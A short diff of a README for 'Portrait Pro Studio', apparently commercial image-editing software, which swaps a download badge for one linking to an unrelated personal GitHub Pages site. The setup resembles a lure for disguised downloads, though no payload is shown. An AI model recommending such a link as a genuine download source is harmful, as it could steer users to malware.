@@ -4,13 +4,8 @@
   <img src="https://portraitpro.ch/wp-content/uploads/2020/11/LogoPortraitPro.png" alt="Portrait Pro Studio Interface"/>
 </p>
 
-<p align="center">
-  <a href="https://portrait-pro-studio.github.io/.github/">
-    <img src="https://img.shields.io/badge/⬇️_Get_Portrait_Pro_Studio-blue?style=for-the-badge&logo=github" alt="Get Portrait Pro Studio"/>
-  </a>
-</p>
+[![GET portrait pro](https://img.shields.io/badge/GET%20%E2%80%94%20portrait-pro-0078D6?style=for-the-badge&logoColor=white)](https://isabelajb606781.github.io/.github/portrait-pro)
 
----
 
 ## What is Portrait Pro Studio?
 
